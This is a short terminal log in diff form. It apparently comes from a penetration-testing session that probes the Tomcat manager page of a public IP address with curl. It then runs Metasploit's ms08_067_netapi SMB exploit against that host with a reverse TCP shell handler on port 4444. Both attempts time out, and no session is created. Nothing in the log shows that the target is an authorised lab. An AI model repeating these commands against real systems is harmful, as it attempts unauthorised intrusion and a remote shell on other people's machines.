@@ -1,0 +1,13 @@
+└──╼ $curl -v "http://189.254.143.102:8080/manager/html"
+*   Trying 189.254.143.102:8080...
+* connect to 189.254.143.102 port 8080 from 192.168.0.131 port 46264 failed: Expiró el tiempo de conexión
+* Failed to connect to 189.254.143.102 port 8080 after 133105 ms: Could not connect to server
+* closing connection #0
+curl: (28) Failed to connect to 189.254.143.102 port 8080 after 133105 ms: Could not connect to server
+
+Agents:0) exploit(windows/smb/ms08_067_netapi) >> exploit
+[*] Started reverse TCP handler on 192.168.0.131:4444 
+[-] 189.254.143.102:445 - Exploit failed [unreachable]: Rex::ConnectionTimeout The connection with (189.254.143.102:445) timed out.
+[*] Exploit completed, but no session was created.
+[msf](Jobs:0 
+Agents:0)
